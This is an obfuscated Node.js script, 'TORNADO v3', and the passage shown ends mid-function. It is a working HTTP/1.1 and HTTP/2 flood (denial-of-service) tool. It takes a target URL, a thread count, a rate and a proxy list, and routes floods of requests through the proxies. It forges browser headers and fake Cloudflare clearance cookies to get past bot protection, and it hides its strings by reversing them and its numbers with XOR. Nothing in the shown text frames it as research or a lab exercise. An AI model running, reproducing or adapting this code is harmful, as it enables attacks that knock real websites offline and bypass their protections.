var _0xaee31b = (291390 ^ 291390) + (648873 ^ 648873);
const net = require("net");
_0xaee31b = 795573 ^ 795569;
const tls = require("tls");
var _0x7a_0x673 = (964550 ^ 964549) + (258097 ^ 258104);
const HPACK = require("hpack");
_0x7a_0x673 = "bomgen".split("").reverse().join("");
var _0xaf1b = (369113 ^ 369105) + (107196 ^ 107196);
const cluster = require("cluster");
_0xaf1b = 882915 ^ 882912;
var _0xc9g = (261793 ^ 261800) + (333839 ^ 333832);
const fs = require("fs");
_0xc9g = (799500 ^ 799502) + (449959 ^ 449959);
const os = require("os");
var _0x1abad;
const crypto = require("crypto");
_0x1abad = (626793 ^ 626797) + (874332 ^ 874332);
const {
  exec: exec
} = require("child_process");
const ignoreNames = ["rorrEtseuqeR".split("").reverse().join(""), "rorrEedoCsutatS".split("").reverse().join(""), "rorrEahctpaC".split("").reverse().join(""), "CloudflareError", "rorrEesraP".split("").reverse().join(""), "ParserError", "TimeoutError", "JSONError", "URLError", "InvalidURL", "rorrEyxorP".split("").reverse().join("")];
const ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "DESUFERNNOCE".split("").reverse().join(""), "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "TUODEMITTEKCOSE".split("").reverse().join(""), "EPROTO", "NIAGA_IAE".split("").reverse().join(""), "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "TENONE".split("").reverse().join(""), "NNOCTONE".split("").reverse().join(""), "DNUOFTONE".split("").reverse().join(""), "ATADON_IAE".split("").reverse().join(""), "EMANON_IAE".split("").reverse().join(""), "EADDRNOTAVAIL", "EAFNOSUPPORT", "YDAERLAE".split("").reverse().join(""), "FDABE".split("").reverse().join(""), "ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "HCAERNUTSOHE".split("").reverse().join(""), "MRDIE".split("").reverse().join(""), "EILSEQ", "EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK", "EZISGSME".split("").reverse().join(""), "GNOLOOTEMANE".split("").reverse().join(""), "ENETDOWN", "ENOBUFS", "VEDONE".split("").reverse().join(""), "TNEONE".split("").reverse().join(""), "MEMONE".split("").reverse().join(""), "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "KCOSTONE".split("").reverse().join(""), "EOPNOTSUPP", "MREPE".split("").reverse().join(""), "EPIPE".split("").reverse().join(""), "EPROTONOSUPPORT", "ERANGE", "SFORE".split("").reverse().join(""), "ESHUTDOWN", "ESPIPE", "ESRCH", "EMITE".split("").reverse().join(""), "ETXTBSY", "EXDEV", "NWONKNU".split("").reverse().join(""), "DEPTH_ZERO_SELF_SIGNED_CERT", "ERUTANGIS_FAEL_YFIREV_OT_ELBANU".split("").reverse().join(""), "DERIPXE_SAH_TREC".split("").reverse().join(""), "CERT_NOT_YET_VALID", "ERR_SOCKET_BAD_PORT"];
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(900252 ^ 900252).on("noitpecxEthguacnu".split("").reverse().join(""), function (e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
    return false;
  }
}).on("unhandledRejection", function (e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
    return false;
  }
}).on("warning", e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
    return false;
  }
}).on("PUHGIS".split("").reverse().join(""), () => {
  return 857803 ^ 857802;
}).on("SIGCHILD", () => {
  return 666883 ^ 666882;
});
var _0xf21b2e;
const statusesQ = [];
_0xf21b2e = (847562 ^ 847561) + (560308 ^ 560309);
let statuses = {};
let isFull = process.argv.includes("--full");
let isUltra = process.argv.includes("artlu--".split("").reverse().join(""));
let custom_table = 905396 ^ 864075;
var _0x7e44g;
let custom_window = 6291456;
_0x7e44g = (227078 ^ 227086) + (913164 ^ 913156);
let custom_header = 262144;
let custom_update = 15663105;
var _0x2b0a = (992198 ^ 992194) + (535338 ^ 535341);
let timer = 898477 ^ 898477;
_0x2b0a = (243530 ^ 243530) + (648641 ^ 648643);
var _0x2a_0x222 = (764835 ^ 764842) + (597391 ^ 597382);
const CHAR_POOL = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
_0x2a_0x222 = "bfolpf".split("").reverse().join("");
var _0xb_0x5a2 = (100868 ^ 100877) + (468154 ^ 468156);
const CHAR_POOL_EXTENDED = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
_0xb_0x5a2 = "pcdfgh".split("").reverse().join("");
var _0x77f7a = (704883 ^ 704880) + (379184 ^ 379187);
const CHAR_POOL_LOWER = "zyxwvutsrqponmlkjihgfedcba".split("").reverse().join("");
_0x77f7a = (745424 ^ 745427) + (531236 ^ 531237);
const randomStringCache = new Map();
var _0xf_0xa31 = (186612 ^ 186612) + (996542 ^ 996534);
const MAX_CACHE_SIZE = 589092 ^ 589008;
_0xf_0xa31 = "mnomdl";
function generateRandomStringFast(length, _0x977fc) {
  var _0xdgd2c;
  _0x977fc = "";
  _0xdgd2c = (902695 ^ 902703) + (600051 ^ 600054);
  for (let i = 249771 ^ 249771; i < length; i++) {
    _0x977fc += CHAR_POOL[Math.floor(Math.random() * (252601 ^ 252551))];
  }
  return _0x977fc;
}
function randstr(length) {
  const _0xgb9b = randomStringCache.get(length);
  if (_0xgb9b && _0xgb9b.length > (817805 ^ 817805)) {
    return _0xgb9b.pop();
  }
  if (!_0xgb9b || _0xgb9b.length < (849628 ^ 849646)) {
    setImmediate(() => {
      if (!randomStringCache.has(length)) {
        randomStringCache.set(length, []);
      }
      const _0xf549e = randomStringCache.get(length);
      while (_0xf549e.length < MAX_CACHE_SIZE) {
        _0xf549e.push(generateRandomStringFast(length));
      }
    });
  }
  return generateRandomStringFast(length);
}
function randstrr(length, _0x8197aa) {
  var _0xff79ba = (447793 ^ 447795) + (465739 ^ 465736);
  _0x8197aa = "";
  _0xff79ba = (271515 ^ 271515) + (460232 ^ 460237);
  for (let i = 929816 ^ 929816; i < length; i++) {
    _0x8197aa += CHAR_POOL_EXTENDED[Math.floor(Math.random() * (453994 ^ 453930))];
  }
  return _0x8197aa;
}
function ememmmmmemmeme(minLength, maxLength, _0x55cd) {
  const _0xcf775g = Math.floor(Math.random() * (maxLength - minLength + (527184 ^ 527185))) + minLength;
  var _0x8a74d = (925133 ^ 925131) + (441186 ^ 441184);
  _0x55cd = "";
  _0x8a74d = (662049 ^ 662049) + (175189 ^ 175196);
  for (let i = 240726 ^ 240726; i < _0xcf775g; i++) {
    _0x55cd += CHAR_POOL_LOWER[Math.floor(Math.random() * (696152 ^ 696130))];
  }
  return _0x55cd;
}
const PREFACE = "\n\r\n\rMS\n\r\n\r0.2/PTTH * IRP".split("").reverse().join("");
const reqmethod = process.argv[574007 ^ 574005];
const target = process.argv[917602 ^ 917601];
var _0xf9d;
const time = process.argv[619775 ^ 619771];
_0xf9d = (223885 ^ 223876) + (298658 ^ 298667);
var _0xa6cgac;
const threads = process.argv[605569 ^ 605572];
_0xa6cgac = (759421 ^ 759417) + (413684 ^ 413692);
var _0xdcc2ea;
const ratelimit = process.argv[301808 ^ 301814];
_0xdcc2ea = "foghcc".split("").reverse().join("");
const proxyfile = process.argv[820881 ^ 820886];
var _0x376g2c = (894099 ^ 894096) + (281687 ^ 281683);
const forceHttpIndex = process.argv.indexOf("--http");
_0x376g2c = "kehdij".split("").reverse().join("");
var _0x7f_0xbe7 = (761107 ^ 761104) + (684262 ^ 684256);
let forceHttp = 967216 ^ 967218;
_0x7f_0xbe7 = "lmjoch".split("").reverse().join("");
if (forceHttpIndex !== -(116945 ^ 116944) && forceHttpIndex + (887411 ^ 887410) < process.argv.length) {
  var _0xb3e7fb;
  const httpValue = process.argv[forceHttpIndex + (641285 ^ 641284)];
  _0xb3e7fb = "mkhgjq".split("").reverse().join("");
  if (httpValue === "mix") {
    forceHttp = undefined;
  } else {
    forceHttp = parseInt(httpValue);
  }
}
var _0xe9eb7d;
const queryIndex = process.argv.indexOf("--query");
_0xe9eb7d = 101610 ^ 101602;
const query = queryIndex !== -(269774 ^ 269775) && queryIndex + (635017 ^ 635016) < process.argv.length ? process.argv[queryIndex + (121803 ^ 121802)] : undefined;
var _0xa2a8e = (746553 ^ 746553) + (999701 ^ 999698);
const bfmFlagIndex = process.argv.indexOf("--bfm");
_0xa2a8e = (885536 ^ 885536) + (813417 ^ 813419);
var _0x5d34e;
const bfmFlag = bfmFlagIndex !== -(179838 ^ 179839) && bfmFlagIndex + (817052 ^ 817053) < process.argv.length ? process.argv[bfmFlagIndex + (152673 ^ 152672)] : undefined;
_0x5d34e = 733264 ^ 733271;
var _0xf4d5c = (443529 ^ 443528) + (660048 ^ 660057);
const delayIndex = process.argv.indexOf("--delay");
_0xf4d5c = 973697 ^ 973701;
const delay = delayIndex !== -(357292 ^ 357293) && delayIndex + (690964 ^ 690965) < process.argv.length ? parseInt(process.argv[delayIndex + (743314 ^ 743315)]) : 852604 ^ 852604;
var _0x2e89ef = (971036 ^ 971038) + (367811 ^ 367819);
const cookieIndex = process.argv.indexOf("eikooc--".split("").reverse().join(""));
_0x2e89ef = "kkgaec".split("").reverse().join("");
const cookieValue = cookieIndex !== -(367797 ^ 367796) && cookieIndex + (329777 ^ 329776) < process.argv.length ? process.argv[cookieIndex + (881702 ^ 881703)] : undefined;
var _0xb2_0x953;
const refererIndex = process.argv.indexOf("--referer");
_0xb2_0x953 = (911456 ^ 911460) + (865818 ^ 865820);
const refererValue = refererIndex !== -(957070 ^ 957071) && refererIndex + (833642 ^ 833643) < process.argv.length ? process.argv[refererIndex + (404777 ^ 404776)] : undefined;
const postdataIndex = process.argv.indexOf("atadtsop--".split("").reverse().join(""));
var _0xaf9e1b = (758023 ^ 758023) + (261623 ^ 261617);
const postdata = postdataIndex !== -(557127 ^ 557126) && postdataIndex + (812809 ^ 812808) < process.argv.length ? process.argv[postdataIndex + (140040 ^ 140041)] : undefined;
_0xaf9e1b = 856803 ^ 856807;
var _0xa_0xd8d;
const randrateIndex = process.argv.indexOf("--randrate");
_0xa_0xd8d = "ipipgd";
var _0xf2_0x599 = (181284 ^ 181293) + (793425 ^ 793433);
const randrate = randrateIndex !== -(807052 ^ 807053) && randrateIndex + (831497 ^ 831496) < process.argv.length ? process.argv[randrateIndex + (815566 ^ 815567)] : undefined;
_0xf2_0x599 = (321961 ^ 321966) + (496121 ^ 496112);
var _0xbgd;
const customHeadersIndex = process.argv.indexOf("--header");
_0xbgd = 334306 ^ 334314;
var _0x676g8e = (851438 ^ 851430) + (928161 ^ 928168);
const customHeaders = customHeadersIndex !== -(266381 ^ 266380) && customHeadersIndex + (355012 ^ 355013) < process.argv.length ? process.argv[customHeadersIndex + (864624 ^ 864625)] : undefined;
_0x676g8e = (834726 ^ 834725) + (740734 ^ 740735);
const customIPindex = process.argv.indexOf("--ip");
const customIP = customIPindex !== -(645601 ^ 645600) && customIPindex + (277454 ^ 277455) < process.argv.length ? process.argv[customIPindex + (927538 ^ 927539)] : undefined;
const customUAindex = process.argv.indexOf("--useragent");
const customUA = customUAindex !== -(553395 ^ 553394) && customUAindex + (753845 ^ 753844) < process.argv.length ? process.argv[customUAindex + (535170 ^ 535171)] : undefined;
var _0x_0x166;
const debugMode = process.argv.includes("gubed--".split("").reverse().join("")) && forceHttp !== (969897 ^ 969896);
_0x_0x166 = (842788 ^ 842789) + (110073 ^ 110078);
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
  console.clear();
  console.error(`
    TORNADO v3 Fixed by @MOemo888- Ultra High Performance Edition
    How to use & example:
      node ${process.argv[238103 ^ 238102]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
      node ${process.argv[853714 ^ 853715]} GET "https://target.com" 120 32 150 proxy.txt --query 1 --cookie "test=1" --delay 0 --ultra
    
    Options:
      --query 1/2/3 - query string patterns
      --delay <0-1000> - delay between requests (ms)
      --cookie "name=value" - custom cookie
      --referer <url/rand> - custom referer
      --postdata "data" - POST data
      --randrate - randomize rate 1-90
      --full - full backend attack mode
      --ultra - ULTRA HIGH PERFORMANCE MODE
      --http 1/2/mix - HTTP version selection
      --debug - show status codes
      --header "name:value" - custom headers (split with #)
    `);
  process.exit(857864 ^ 857865);
}
if (!["GET", "POST", "HEAD", "SNOITPO".split("").reverse().join("")].includes(reqmethod)) {
  console.error("Error: request method must be GET/POST/HEAD/OPTIONS");
  process.exit(631234 ^ 631235);
}
if (!target.startsWith("//:sptth".split("").reverse().join("")) && !target.startsWith("http://")) {
  console.error("Error: protocol must be https:// or http://");
  process.exit(651715 ^ 651714);
}
if (isNaN(time) || time <= (852033 ^ 852033) || time > 86400) {
  console.error("Error: time must be between 1-86400 seconds");
  process.exit(188683 ^ 188682);
}
if (isNaN(threads) || threads <= (981178 ^ 981178) || threads > (106663 ^ 107175)) {
  console.error("Error: threads must be between 1-512");
  process.exit(964001 ^ 964000);
}
if (isNaN(ratelimit) || ratelimit <= (619293 ^ 619293)) {
  console.error("0 naht retaerg eb tsum timiletar :rorrE".split("").reverse().join(""));
  process.exit(899919 ^ 899918);
}
var _0xee2b = (500836 ^ 500836) + (472012 ^ 472011);
let hcookie = "";
_0xee2b = (783264 ^ 783271) + (847815 ^ 847809);
var _0xf9830a = (168387 ^ 168391) + (556745 ^ 556737);
const timestamp = Date.now();
_0xf9830a = (377536 ^ 377544) + (484737 ^ 484738);
var _0x34e = (261753 ^ 261757) + (794358 ^ 794359);
const timestampString = timestamp.toString().substring(912741 ^ 912741, 801471 ^ 801461);
_0x34e = (838083 ^ 838091) + (178880 ^ 178885);
var _0x8g167d;
const url = new URL(target);
_0x8g167d = (468003 ^ 468002) + (253213 ^ 253214);
var _0xga12fb = (879656 ^ 879649) + (102758 ^ 102753);
let proxy;
_0xga12fb = (332982 ^ 332978) + (403798 ^ 403799);
try {
  proxy = fs.readFileSync(proxyfile, "8ftu".split("").reverse().join("")).replace(new RegExp("\\r", "g"), "").split("\n").filter(p => p.trim());
  if (proxy.length === (584614 ^ 584614)) {
    console.error("Error: proxy file is empty");
    process.exit(536336 ^ 536337);
  }
} catch (err) {
  console.error("elif yxorp daer tonnac :rorrE".split("").reverse().join(""));
  process.exit(960879 ^ 960878);
}
if (bfmFlag && bfmFlag.toLowerCase() === "eurt".split("").reverse().join("")) {
  hcookie = `cf_clearance=${randstr(146412 ^ 146426)}_${randstr(107533 ^ 107532)}.${randstr(644102 ^ 644101)}.${randstr(756556 ^ 756546)}-${timestampString}-1.0-${randstr(597130 ^ 597132)}+${randstr(113340 ^ 113388)}=`;
}
if (cookieValue) {
  if (cookieValue === "%DNAR%".split("").reverse().join("")) {
    hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(440117 ^ 440115, 982090 ^ 982092)}` : ememmmmmemmeme(819146 ^ 819148, 500794 ^ 500796);
  } else {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
  }
}
function encodeFrame(streamId, type, payload = "", flags = 820356 ^ 820356) {
  const _0x142efg = typeof payload === "string" ? Buffer.byteLength(payload) : payload.length;
  const _0xcdd94a = Buffer.alloc(318572 ^ 318565);
  _0xcdd94a.writeUInt32BE(_0x142efg << (417529 ^ 417521) | type, 287038 ^ 287038);
  _0xcdd94a.writeUInt8(flags, 969295 ^ 969291);
  _0xcdd94a.writeUInt32BE(streamId, 589049 ^ 589052);
  if (_0x142efg > (168300 ^ 168300)) {
    var _0x34gf = (957532 ^ 957525) + (697879 ^ 697877);
    const _0x7045g = typeof payload === "string" ? Buffer.from(payload) : payload;
    _0x34gf = (634587 ^ 634579) + (872320 ^ 872325);
    return Buffer.concat([_0xcdd94a, _0x7045g]);
  }
  return _0xcdd94a;
}
function decodeFrame(data) {
  if (data.length < (808877 ^ 808868)) {
    return null;
  }
  var _0x6327c = (241581 ^ 241578) + (201074 ^ 201073);
  const _0x292f8f = data.readUInt32BE(476251 ^ 476251);
  _0x6327c = (750085 ^ 750080) + (879222 ^ 879230);
  const _0x28c = _0x292f8f >> (270359 ^ 270367);
  const _0x22gcf = _0x292f8f & (194079 ^ 194272);
  const _0x7e0dcb = data.readUInt8(269387 ^ 269391);
  var _0xc4e;
  const _0x35990b = data.readUInt32BE(845062 ^ 845059);
  _0xc4e = (910355 ^ 910356) + (943920 ^ 943924);
  const _0xb3_0x822 = _0x7e0dcb & (446526 ^ 446494) ? 669877 ^ 669872 : 527243 ^ 527243;
  if (data.length < (343952 ^ 343961) + _0xb3_0x822 + _0x28c) {
    return null;
  }
  let _0x85g2bc = Buffer.alloc(860523 ^ 860523);
  if (_0x28c > (896253 ^ 896253)) {
    _0x85g2bc = data.subarray((864703 ^ 864694) + _0xb3_0x822, (629938 ^ 629947) + _0xb3_0x822 + _0x28c);
  }
  return {
    streamId: _0x35990b,
    length: _0x28c,
    type: _0x22gcf,
    flags: _0x7e0dcb,
    payload: _0x85g2bc
  };
}
function encodeSettings(settings) {
  const _0xcab0e = Buffer.alloc((617944 ^ 617950) * settings.length);
  for (let i = 519288 ^ 519288; i < settings.length; i++) {
    _0xcab0e.writeUInt16BE(settings[i][651154 ^ 651154], i * (501699 ^ 501701));
    _0xcab0e.writeUInt32BE(settings[i][615731 ^ 615730], i * (603295 ^ 603289) + (781373 ^ 781375));
  }
  return _0xcab0e;
}
function encodeRstStream(streamId, type, flags) {
  var _0x4b_0xab1 = (745309 ^ 745300) + (310758 ^ 310752);
  const _0xec7fd = Buffer.alloc(549605 ^ 549608);
  _0x4b_0xab1 = (524826 ^ 524826) + (200340 ^ 200340);
  _0xec7fd.writeUInt32BE(173535 ^ 173531, 128991 ^ 128991);
  _0xec7fd.writeUInt8(type, 235665 ^ 235669);
  _0xec7fd.writeUInt8(flags, 787837 ^ 787832);
  _0xec7fd.writeUInt32BE(streamId, 778439 ^ 778434);
  _0xec7fd.writeUInt32BE(483151 ^ 483151, 632388 ^ 632397);
  return _0xec7fd;
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + (893347 ^ 893346))) + min;
}
const browserVersions = [306336 ^ 306392, 836073 ^ 835984, 783112 ^ 783218, 307415 ^ 307372, 987981 ^ 987953, 854951 ^ 855002];
var _0xec_0x7bf = (170914 ^ 170918) + (889470 ^ 889470);
const browsers = ["Google Chrome", "Brave"];
_0xec_0x7bf = "fbompi";
const brandTemplates = {
  120: (browser, version) => `"Not_A Brand";v="8", "Chromium";v="${version}", "${browser}";v="${version}"`,
  121: (browser, version) => `"Not A(Brand";v="99", "${browser}";v="${version}", "Chromium";v="${version}"`,
  122: (browser, version) => `"Chromium";v="${version}", "Not(A:Brand";v="24", "${browser}";v="${version}"`,
  123: (browser, version) => `"${browser}";v="${version}", "Not:A-Brand";v="8", "Chromium";v="${version}"`,
  124: (browser, version) => `"${browser}";v="${version}", "Not)A;Brand";v="99", "Chromium";v="${version}"`,
  125: (browser, version) => `"${browser}";v="${version}", "Not.A/Brand";v="8", "Chromium";v="${version}"`
};
function buildRequest(_0x2a7d, _0x55819b) {
  var _0x2_0x752 = (854157 ^ 854153) + (738228 ^ 738226);
  const _0x6c_0xdfe = browserVersions[Math.floor(Math.random() * browserVersions.length)];
  _0x2_0x752 = (581725 ^ 581727) + (511626 ^ 511630);
  const _0x5_0xb4f = browsers[Math.floor(Math.random() * browsers.length)];
  const _0xe3f5f = brandTemplates[_0x6c_0xdfe](_0x5_0xb4f, _0x6c_0xdfe);
  const _0x23aed = _0x5_0xb4f === "evarB".split("").reverse().join("");
  var _0x93aagd = (433169 ^ 433174) + (797867 ^ 797859);
  const _0xef5b = _0x23aed ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" : "7.0=q;3b=v;egnahcxe-dengis/noitacilppa,8.0=q;*/*,gnpa/egami,pbew/egami,fiva/egami,9.0=q;lmx/noitacilppa,lmx+lmthx/noitacilppa,lmth/txet".split("").reverse().join("");
  _0x93aagd = (413762 ^ 413770) + (201515 ^ 201516);
  var _0xb322a;
  const _0x7f4cg = _0x23aed ? "en-US,en;q=0.9" : "en-US,en;q=0.7";
  _0xb322a = (217287 ^ 217281) + (638660 ^ 638669);
  const _0x17632e = customUA || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${_0x6c_0xdfe}.0.0.0 Safari/537.36`;
  var _0x15bf1d;
  const _0x8a93e = refererValue === "dnar".split("").reverse().join("") ? "https://" + ememmmmmemmeme(770449 ^ 770455, 137552 ^ 137558) + ".net" : refererValue;
  _0x15bf1d = "ieoggm";
  var _0x3cee = (198250 ^ 198252) + (438246 ^ 438255);
  _0x2a7d = "\n\r".split("").reverse().join("");
  _0x3cee = 243459 ^ 243459;
  var _0xa9475b;
  _0x55819b = "\r\n";
  _0xa9475b = (912230 ^ 912227) + (777135 ^ 777126);
  if (hcookie || _0x8a93e) {
    _0x2a7d = "\r\n";
    _0x55819b = "";
  } else {
    _0x2a7d = "";
    _0x55819b = "\r\n";
  }
  var _0x181e = (309859 ^ 309856) + (566078 ^ 566079);
  let _0xb9eacc = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` + `Accept: ${_0xef5b}\r\n` + "\n\rrb ,etalfed ,pizg :gnidocnE-tpeccA".split("").reverse().join("") + `Accept-Language: ${_0x7f4cg}\r\n` + "\n\r0=ega-xam :lortnoC-ehcaC".split("").reverse().join("") + "Connection: Keep-Alive\r\n" + `Host: ${url.hostname}\r\n` + "\n\rtnemucod :tseD-hcteF-ceS".split("").reverse().join("") + "\n\retagivan :edoM-hcteF-ceS".split("").reverse().join("") + "Sec-Fetch-Site: none\r\n" + "\n\r1? :resU-hcteF-ceS".split("").reverse().join("") + "Upgrade-Insecure-Requests: 1\r\n" + `User-Agent: ${_0x17632e}\r\n` + `sec-ch-ua: ${_0xe3f5f}\r\n` + "\n\r0? :elibom-au-hc-ces".split("").reverse().join("") + "sec-ch-ua-platform: \"Windows\"\r\n" + _0x55819b;
  _0x181e = (296520 ^ 296526) + (883848 ^ 883849);
  if (hcookie) {
    _0xb9eacc += `Cookie: ${hcookie}\r\n`;
  }
  if (_0x8a93e) {
    _0xb9eacc += `Referer: ${_0x8a93e}\r\n` + _0x2a7d;
  }
  return Buffer.from(_0xb9eacc, "yranib".split("").reverse().join(""));
}
const http1Payload = Buffer.concat(new Array(665339 ^ 665338).fill(buildRequest()));
let connectionAttempts = 235110 ^ 235110;
var _0x139f = (875406 ^ 875407) + (650262 ^ 650263);
const MAX_CONNECTION_ATTEMPTS = 501192 ^ 501195;
_0x139f = (176388 ^ 176391) + (245066 ^ 245059);
function go(_0x2f_0x913) {
  if (connectionAttempts >= MAX_CONNECTION_ATTEMPTS) {
    connectionAttempts = 268257 ^ 268257;
    // TOLOOK
    setTimeout(go, 470353 ^ 470713);
    return;
  }
  let [proxyHost, proxyPort] = customIP ? customIP.split(":") : proxy[Math.floor(Math.random() * proxy.length)].split(":");
  if (!proxyPort || isNaN(proxyPort)) {
    connectionAttempts++;
    // TOLOOK
    setTimeout(go, 934732 ^ 934696);
    return;
  }
  var _0xa338fd = (377203 ^ 377204) + (838663 ^ 838671);
  const _0x52870f = net.connect(Number(proxyPort), proxyHost, () => {
    connectionAttempts = 986107 ^ 986107;
    _0x52870f.once("data", () => {
      _0x2f_0x913 = tls.connect({
        socket: _0x52870f,
        ALPNProtocols: forceHttp === (739139 ^ 739138) ? ["1.1/ptth".split("").reverse().join("")] : forceHttp === (110791 ^ 110789) ? ["h2"] : forceHttp === undefined ? Math.random() >= 0.5 ? ["2h".split("").reverse().join("")] : ["1.1/ptth".split("").reverse().join("")] : ["h2", "1.1/ptth".split("").reverse().join("")],
        servername: url.host,
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
        secure: true,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        rejectUnauthorized: false,
        requestCert: false,
        agent: false,
        session: false
      }, () => {
        if (!_0x2f_0x913.alpnProtocol || _0x2f_0x913.alpnProtocol === "http/1.1") {
          if (forceHttp === (612837 ^ 612839)) {
            _0x2f_0x913.end(() => _0x2f_0x913.destroy());
            return;
          }
          function _0x1a83d() {
            if (_0x2f_0x913.destroyed) {
              return;
            }
            _0x2f_0x913.write(http1Payload, err => {
              if (!err) {
                var _0xf942fd = (406342 ^ 406338) + (514489 ^ 514491);
                const _0xa9a29a = isUltra ? 915933 ^ 915933 : isFull ? 437913 ^ 438125 : (167168 ^ 167656) / ratelimit;
                _0xf942fd = (971816 ^ 971818) + (870241 ^ 870246);
                // TOLOOK
                setTimeout(_0x1a83d, _0xa9a29a);
              } else {
                _0x2f_0x913.end(() => _0x2f_0x913.destroy());
              }
            });
          }
          _0x1a83d();
          _0x2f_0x913.on("error", () => {
            _0x2f_0x913.end(() => _0x2f_0x913.destroy());
          });
          return;
        }
        if (forceHttp === (579259 ^ 579258)) {
          _0x2f_0x913.end(() => _0x2f_0x913.destroy());
          return;
        }
        let _0x65e = 228416 ^ 228417;
        let _0x63ef = Buffer.alloc(397767 ^ 397767);
        var _0xcebcbb;
        let _0x59722g = new HPACK();
        _0xcebcbb = (224531 ^ 224533) + (201557 ^ 201558);
        _0x59722g.setTableSize(819928 ^ 824024);
        const _0x3e8abe = Buffer.alloc(126445 ^ 126441);
        _0x3e8abe.writeUInt32BE(custom_update, 297186 ^ 297186);
        var _0x87c4ca;
        const _0x6_0xcdd = [Buffer.from(PREFACE, "yranib".split("").reverse().join("")), encodeFrame(661451 ^ 661451, 712673 ^ 712677, encodeSettings([[163518 ^ 163519, custom_header], [980838 ^ 980836, 791377 ^ 791377], [290297 ^ 290301, custom_window], [537314 ^ 537316, custom_table]])), encodeFrame(776215 ^ 776215, 168239 ^ 168231, _0x3e8abe)];
        _0x87c4ca = 751519 ^ 751510;
        _0x2f_0x913.on("data", eventData => {
          _0x63ef = Buffer.concat([_0x63ef, eventData]);
          while (_0x63ef.length >= (724374 ^ 724383)) {
            var _0xge1c = (314062 ^ 314061) + (121720 ^ 121723);
            const _0x6fc = decodeFrame(_0x63ef);
            _0xge1c = 947913 ^ 947919;
            if (_0x6fc !== null) {
              _0x63ef = _0x63ef.subarray(_0x6fc.length + (603261 ^ 603252));
              if (_0x6fc.type === (198515 ^ 198519) && _0x6fc.flags === (749187 ^ 749187)) {
                _0x2f_0x913.write(encodeFrame(474333 ^ 474333, 723132 ^ 723128, "", 284536 ^ 284537));
              }
              if (_0x6fc.type === (992131 ^ 992130) && debugMode) {
                try {
                  const _0x3b43a = _0x59722g.decode(_0x6fc.payload).find(x => x[697410 ^ 697410] === "sutats:".split("").reverse().join(""))[721313 ^ 721312];
                  if (!statuses[_0x3b43a]) {
                    statuses[_0x3b43a] = 308129 ^ 308129;
                  }
                  statuses[_0x3b43a]++;
                } catch (e) {}
              }
              if (_0x6fc.type === (861888 ^ 861895) || _0x6fc.type === (217818 ^ 217823)) {
                if (_0x6fc.type === (455570 ^ 455573) && debugMode) {
                  if (!statuses.GOAWAY) {
                    statuses.GOAWAY = 622952 ^ 622952;
                  }
                  statuses.GOAWAY++;
                }
                _0x2f_0x913.write(encodeRstStream(317333 ^ 317333, 152751 ^ 152748, 181307 ^ 181307));
                _0x2f_0x913.end(() => _0x2f_0x913.destroy());
              }
            } else {
              break;
            }
          }
        });
        _0x2f_0x913.write(Buffer.concat(_0x6_0xcdd));
        function _0x59adeb() {
          if (_0x2f_0x913.destroyed) {
            return;
          }
          var _0x175b = (370734 ^ 370729) + (259503 ^ 259501);
          const _0x6g85e = [];
          _0x175b = "bpkfpk".split("").reverse().join("");
          var _0x9b_0xaf6;
          const _0xbef1bc = [];
          _0x9b_0xaf6 = 147249 ^ 147257;
          if (customHeaders) {
            const _0x409cgf = customHeaders.split("#");
            for (const _0x6e31fb of _0x409cgf) {
              const [name, value] = _0x6e31fb.split(":");
              if (name && value) {
                _0xbef1bc.push({
                  [name.trim().toLowerCase()]: value.trim()
                });
              }
            }
          }
          let _0x9dcf = randrate !== undefined ? getRandomInt(671062 ^ 671063, 817232 ^ 817162) : ratelimit;
          const _0x4ca = isUltra ? Math.min(_0x9dcf * (879181 ^ 879183), 950493 ^ 950457) : isFull ? _0x9dcf : 958089 ^ 958088;
          for (let i = 110581 ^ 110581; i < _0x4ca; i++) {
            var _0x4ac2c;
            const _0x08b8fd = browserVersions[Math.floor(Math.random() * browserVersions.length)];
            _0x4ac2c = 489168 ^ 489171;
            var _0xd7c4af;
            const _0xg4gfa = browsers[Math.floor(Math.random() * browsers.length)];
            _0xd7c4af = (974042 ^ 974041) + (889619 ^ 889617);
            var _0x6c59df = (160552 ^ 160559) + (711733 ^ 711729);
            const _0xbf39c = brandTemplates[_0x08b8fd](_0xg4gfa, _0x08b8fd);
            _0x6c59df = (798874 ^ 798873) + (770210 ^ 770219);
